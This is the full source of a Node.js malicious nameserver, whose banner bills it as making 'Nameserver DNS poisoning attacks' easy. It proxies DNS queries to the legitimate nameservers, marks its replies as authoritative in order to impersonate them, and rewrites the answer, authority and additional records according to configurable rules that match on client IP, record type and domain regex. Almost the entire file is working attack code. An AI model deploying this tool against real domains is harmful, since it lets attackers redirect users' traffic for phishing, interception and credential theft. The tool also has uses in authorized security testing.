#!/usr/bin/env node
let _ = require( "lodash" );
let dns = require( "native-dns" );
let Promise = require( "bluebird" );
let rangeCheck = require( "range_check" );
let SETTINGS = require( "./config.json" );
let server = dns.createServer();


let RRCODE_TO_QUERY_NAME_MAP = {
    1: "A",
    28: "AAAA",
    18: "AFSDB",
    42: "APL",
    257: "CAA",
    60: "CDNSKEY",
    59: "CDS",
    37: "CERT",
    5: "CNAME",
    49: "DHCID",
    32769: "DLV",
    48: "DNSKEY",
    43: "DS",
    45: "IPSECKEY",
    25: "KEY",
    36: "KX",
    29: "LOC",
    15: "MX",
    35: "NAPTR",
    2: "NS",
    47: "NSEC",
    50: "NSEC3",
    51: "NSEC3PARAM",
    12: "PTR",
    46: "RRSIG",
    17: "RP",
    24: "SIG",
    6: "SOA",
    33: "SRV",
    44: "SSHFP",
    32768: "TA",
    249: "TKEY",
    52: "TLSA",
    250: "TSIG",
    16: "TXT",
    256: "URI"
}

let RCODE_TO_RESPONSE_CODE_NAME_MAP = {
    0: "NOERROR",
    1: "FORMERR",
    2: "SERVFAIL",
    3: "NXDOMAIN",
    4: "NOTIMP",
    5: "REFUSED",
    6: "YXDOMAIN",
    7: "YXRRSET",
    8: "NXRRSET",
    9: "NOTAUTH",
    10: "NOTZONE",
    16: "BADSIG",
    17: "BADKEY",
    18: "BADTIME",
    19: "BADMODE",
    20: "BADNAME",
    21: "BADALG",
    22: "BADTRUNC",
    23: "BADCOOKIE"
}

/*
 * Get random element from target array
 */
function get_random_value( input_array ) {
    return input_array[ Math.floor( Math.random() * input_array.length ) ];
}

let logger = {
    "is_verbose": true,

    "info": function( input, queryid ) {
        if( logger.is_verbose ) {
            if( queryid != undefined ) {
                console.log( "[ INFO ][ ID #" + queryid + " ]", input );
            } else {
                console.log( "[ INFO ] ", input );
            }
        }
    },

    "error": function( input, queryid ) {
        if( logger.is_verbose ) {
            if( queryid != undefined ) {
                console.log( "[ ERROR ][ ID #" + queryid + " ]", input );
            } else {
                console.log( "[ ERROR ] ", input );
            }
        }
    },

    "success": function( input, queryid ) {
        if( logger.is_verbose ) {
            if( queryid != undefined ) {
                console.log( "[ SUCCESS ][ ID #" + queryid + " ]", input );
            } else {
                console.log( "[ SUCCESS ] ", input );
            }
        }
    },

    "raw": function( input ) {
        if( logger.is_verbose ) {
            console.log( input );
        }
    },
}

/*
 * Checks if string is in target.
 */
function contains( input_string, sub_string) {
    return ( input_string.indexOf( sub_string ) !== -1 );
}


/*
 * Pretty print object/array
 */
function pprint( input ) {
    JSON.stringify(
        JSON.parse(
            input
        ),
        null,
        4
    );
}

function dns_request( request_data ) {
    return new Promise( function( resolve, reject ) {
        let req = dns.Request( request_data );

        req.on( "timeout", function () {
            reject({
                "error": "TIMEOUT",
                "raw_error": "",
                "request": request_data,
            })
        });

        req.on( "message", function ( err, answer ) {
            resolve( answer );
        });

        req.send();
    });
}

function rule_matches( request, response, modification_rule ) {
    function query_type_matches() {
        if( "query_type_matches" in modification_rule ) {
           return ( contains( rrcode_to_queryname( response.question[0].type ), modification_rule.query_type_matches ) ||
                   contains( "*", modification_rule.query_type_matches ) );
        }
        return true;
    }

    function ip_range_matches() {
        if( "ip_range_matches" in modification_rule ) {
            for( const range of modification_rule.ip_range_matches ) {
                if( rangeCheck.inRange( request.address.address, range ) ) {
                    return true;
                }
            }
            return false
        }
        return true;
    }

    function response_code_matches() {
        if( "response_code_matches" in modification_rule ) {
           return ( rcode_to_responsename( response.header.rcode === modification_rule.response_code_matches ) ||
                   contains( "*", modification_rule.response_code_matches ) );
        }
        return true;
    }

    function query_name_matches() {
        if( "query_name_matches" in modification_rule ) {
            for( const regex of modification_rule.query_name_matches ) {
                let re = new RegExp(regex, "i")
                if(re.test(request.question.name)){
                    return true
                }
            }
            return false
        }
        return true
    }

    return Boolean( query_type_matches() && ip_range_matches() && response_code_matches() && query_name_matches() );
}

function apply_response_modifications( request, response ) {
    SETTINGS.rules.map(function( modification_rule ) {
        if( rule_matches( request, response, modification_rule ) ) {
            logger.info( "Query matched rule! Applying modifications from \"" + modification_rule.name + "\"...", response.header.id );
            modification_rule.modifications.map(function( modification ) {
                if( "header" in modification ) {
                    response.header = _.merge( response.header, modification.header );
                }

                if( "question" in modification ) {
                    response.question = modification.question;
                }

                if( "answer" in modification ) {
                    response.answer = modification.answer;
                }

                if( "authority" in modification ) {
                    response.authority = modification.authority;
                }

                if( "additional" in modification ) {
                    response.additional = modification.additional;
                }

                if( "edns_options" in modification ) {
                    response.edns_options = modification.edns_options;
                }
            });
        }
    });
    return response;
}

function rrcode_to_queryname( rrcode ) {
    if( rrcode in RRCODE_TO_QUERY_NAME_MAP ) {
        return RRCODE_TO_QUERY_NAME_MAP[ rrcode ];
    }
    return "UKNOWN";
}

function rcode_to_responsename( rcode ) {
    if( rcode in RCODE_TO_RESPONSE_CODE_NAME_MAP ) {
        return RCODE_TO_RESPONSE_CODE_NAME_MAP[ rcode ];
    }
    return "UKNOWN";
}

function queryname_to_rrcode( queryname ) {
    queryname = queryname.toUpperCase();
    for ( let key in RRCODE_TO_QUERY_NAME_MAP ) {
        if( RRCODE_TO_QUERY_NAME_MAP.hasOwnProperty( key ) && RRCODE_TO_QUERY_NAME_MAP[ key ] == queryname ) {
            return key;
        }
    }
    return -1;
}

server.on( "request", function( request, response ) {
    const request_id = request.header.id; // So we can clone the header from the DNS request and reply with it without breaking the ID match.
    request.question = request.question[0];
    logger.info( rrcode_to_queryname( request.question.type ) + " query for " + request.question.name +  " received from " + request.address.address, request_id );
    let legit_ns_ip = get_random_value( SETTINGS.target_nameservers );
    let legit_ns_port = 53
    if(contains(legit_ns_ip, ":")){
        legit_ns_port = Number(legit_ns_ip.split(':')[1])
        legit_ns_ip = legit_ns_ip.split(':')[0]
    }
    const forwarded_request = dns.Request({
        "question": request.question,
        "server": {
            "address": legit_ns_ip,
            "port": legit_ns_port,
            "type": "udp"
        },
        "timeout": SETTINGS.dns_query_timeout,
    });

    dns_request( forwarded_request ).then(function( query_response ) {
        response.header = query_response.header;
        response.header.id = request_id;
        response.answer = query_response.answer;
        response.authority = query_response.authority;
        response.additional = query_response.additional;
        response.edns_options = query_response.edns_options;
        response.payload = query_response.payload;
        response.header.aa = 1; // Since we're impersonating an authoritative nameserver, set the Authoritative Answer Flag bit.
        apply_response_modifications( request, response );
        response.send();
    }, function( error ) {
        logger.error( "Error occured while requesting answer from " + legit_ns_ip, request_id );
        logger.raw( error );
    });
});

server.on( "error", function (err, buff, req, res) {
    logger.error( err.stack );
});

server.serve( SETTINGS.port ); // Luke
logger.raw(
"                                                   \r\n                          ,,                                                        \r\n   `7MMF\'               `7MM                       `7MM\"\"\"Yb. `7MN.   `7MF\'.M\"\"\"bgd \r\n     MM                   MM                         MM    `Yb. MMN.    M ,MI    \"Y \r\n     MM `7MM  `7MM   ,M\"\"bMM   ,6\"Yb.  ,pP\"Ybd       MM     `Mb M YMb   M `MMb.     \r\n     MM   MM    MM ,AP    MM  8)   MM  8I   `\"       MM      MM M  `MN. M   `YMMNq. \r\n     MM   MM    MM 8MI    MM   ,pm9MM  `YMMMa.       MM     ,MP M   `MM.M .     `MM \r\n(O)  MM   MM    MM `Mb    MM  8M   MM  L.   I8       MM    ,dP\' M     YMM Mb     dM \r\n Ymmm9    `Mbod\"YML.`Wbmd\"MML.`Moo9^Yo.M9mmmP\'     .JMMmmmdP\' .JML.    YM P\"Ybmmd\"  \r\n\r\n                                         Nameserver DNS poisoning attacks made easy"
);
